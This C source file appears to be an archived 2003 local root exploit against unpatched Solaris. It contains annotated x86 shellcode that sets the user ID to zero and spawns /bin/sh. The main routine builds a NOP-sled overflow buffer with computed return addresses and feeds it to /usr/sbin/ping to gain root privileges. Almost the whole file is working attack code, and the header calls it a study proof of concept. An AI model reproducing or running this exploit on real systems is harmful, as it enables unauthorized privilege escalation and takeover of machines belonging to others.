/***********************************************************
* hoagie_solarisldap.c
*
* gcc hoagie_solarisldap.c -o hoagie_solarisldap
*
* Author: Andi <andi@void.at>
*
* Greetz to Greuff, philipp and the other hoagie-fellas :-)
*
* THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
* CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
* DAMAGE DONE USING THIS PROGRAM.
*
*
* Offsets: 9208 ... without patch 108994-11
*
************************************************************/

#include <stdio.h>

#define NOP 0x90
#define ORIGSIZE 258

char shellcode[]=
/* main: */
"\xeb\x0a" /* jmp initcall */

/* initlcall: */
"\x9a\x01\x02\x03\x5c\x07\x04" /* lcall */
"\xc3" /* ret */

/* jmpz: */
"\xeb\x05" /* jmp setuidcode */

/* initcall: */
"\xe8\xf9\xff\xff\xff" /* call jmpz */

/* setuidcode: */
"\x5e" /* popl %esi */
"\x29\xc0" /* subl %eax, %eax */
"\x88\x46\xf7" /* movb %al, 0xfffffff7(%esi) */
"\x89\x46\xf2" /* movl %eax, 0xfffffff2(%esi) */

/* seteuid(0); */
"\x50" /* pushl %eax */
"\xb0\x8d" /* movb $0x8d, %al */
"\xe8\xe0\xff\xff\xff" /* call initlcall */
/* setuid(0); */
"\x29\xc0" /* subl %eax, %eax */
"\x50" /* pushl %eax */
"\xb0\x17" /* movb $0x17, %al */
"\xe8\xd6\xff\xff\xff" /* call initlcall */

"\xeb\x1f" /* jmp callz */

/* start: */
/* execve /bin/sh */
"\x5e" /* popl %esi */
"\x8d\x1e" /* leal (%esi), %ebx */
"\x89\x5e\x0b" /* movl %ebx, 0x0b(%esi) */
"\x29\xc0" /* subl %eax, %eax */
"\x88\x46\x19" /* movb %al, 0x19(%esi) */
"\x89\x46\x14" /* movl %eax, 0x14(%esi) */
"\x89\x46\x0f" /* movl %eax, 0x0f(%esi) */
"\x89\x46\x07" /* movl %eax, 0x07(%esi) */
"\xb0\x3b" /* movb $0x3b, %al */
"\x8d\x4e\x0b" /* leal 0x0b(%esi), %ecx */
"\x51" /* pushl %ecx */
"\x51" /* pushl %ecx */
"\x53" /* pushl %ebx */
"\x50" /* pushl %eax */
"\xeb\x18" /* jmp lcall */

/* callz: */
"\xe8\xdc\xff\xff\xff" /* call start */

"\x2f\x62\x69\x6e\x2f\x73\x68" /* /bin/sh */
"\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03"

/* lcall: */
"\x9a\x04\x04\x04\x04\x07\x04"; /* lcall */



unsigned long getsp(void)
{
__asm__(" movl %esp,%eax ");
}

int main(int argc, char **argv) {
char buf[512];
int offset = 9208;
int retaddr = 0;
int i;

if (argc > 1) {
sscanf(argv[1], "%d", &offset);
}

printf("hoagie_solarisldap local root exploit\n");
printf("[*] offset: 0x%x\n", offset);

memset(buf, NOP, sizeof(buf));
buf[28] = 0xeb;
buf[29] = 30;
for (i = 0; i < strlen(shellcode); i++) {
buf[i + 60] = shellcode[i];
}

retaddr = getsp() - offset;
printf("[*] return address: 0x%x\n", retaddr);

for (i = 0; i < 4 * 25; i += 4){
buf[i + ORIGSIZE + 2] = retaddr & 0xff;
buf[i + ORIGSIZE + 3] = (retaddr >> 8 ) &0xff;
buf[i + ORIGSIZE + 0] = (retaddr >> 16 ) &0xff;
buf[i + ORIGSIZE + 1] = (retaddr >> 24 ) &0xff;
}

execl("/usr/sbin/ping", "ping", buf, NULL);
}


// milw0rm.com [2003-04-01]